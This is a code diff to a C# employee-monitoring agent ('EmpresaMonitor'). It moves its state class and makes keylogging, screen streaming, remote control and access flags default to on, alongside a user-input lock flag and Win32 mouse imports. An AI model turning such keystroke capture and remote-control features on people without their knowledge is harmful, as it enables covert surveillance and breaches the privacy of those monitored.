@@ -14,25 +14,25 @@ using System.Threading.Tasks;
 
 namespace EmpresaMonitor.Agent
 {
+    internal sealed class AgentState
+    {
+        public volatile bool AccessActive = true;
+        public volatile bool StreamRequested = true;
+        public volatile bool ControlActive = true;
+        public volatile bool KeylogActive = true;
+        public volatile bool InputLocked = false;
+        public volatile bool MaintenanceActive = false;
+        public volatile bool IsReady = true;
+
+        public StreamSettings Settings = StreamSettings.Balanced;
+        public ClientWebSocket? Socket;
+        public readonly SemaphoreSlim SendGate = new(1, 1);
+        public readonly CancellationTokenSource Lifetime = new();
+        public DateTime? LastBlockTime;
+    }
+
     internal static class Program
     {
-        internal sealed class AgentState
-        {
-            public volatile bool AccessActive;
-            public volatile bool StreamRequested;
-            public volatile bool ControlActive;
-            public volatile bool KeylogActive;
-            public volatile bool InputLocked;
-            public volatile bool MaintenanceActive;
-            public volatile bool IsReady;
-
-            public StreamSettings Settings = StreamSettings.Balanced;
-            public ClientWebSocket? Socket;
-            public readonly SemaphoreSlim SendGate = new(1, 1);
-            public readonly CancellationTokenSource Lifetime = new();
-            public DateTime? LastBlockTime;
-        }
-
         [DllImport("user32.dll")]
         static extern void mouse_event(uint f, uint x, uint y, uint d, UIntPtr e);
 
@@ -461,4 +461,4 @@ namespace EmpresaMonitor.Agent
         [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
         static extern IntPtr GetModuleHandle(string? lpModuleName);
     }
-} // Fim do Namespace
+}
